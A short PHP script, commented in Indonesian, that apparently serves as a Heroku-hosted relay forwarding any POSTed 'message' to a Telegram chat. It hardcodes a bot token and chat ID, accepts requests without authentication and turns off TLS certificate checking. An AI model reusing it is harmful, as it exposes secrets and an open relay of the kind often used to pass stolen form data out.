<?php
// Terima POST dari domain
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['message'])) {
    $message = $_POST['message'];
    
    // Konfigurasi Telegram (sama dengan di script utama)
    $telegram_bot_token = "8956629261:AAF7KhZeDaAuhI9eO8QFtCs5mYwKA4duayM";
    $telegram_chat_id    = "5141612560";
    
    // Kirim ke Telegram via curl
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    $data = ['chat_id' => $telegram_chat_id, 'text' => $message];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $res = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http == 200) {
        echo "OK";
    } else {
        echo "FAIL:$http";
    }
} else {
    echo "Proxy Heroku untuk notifikasi Telegram. Kirim POST dengan parameter 'message'.";
}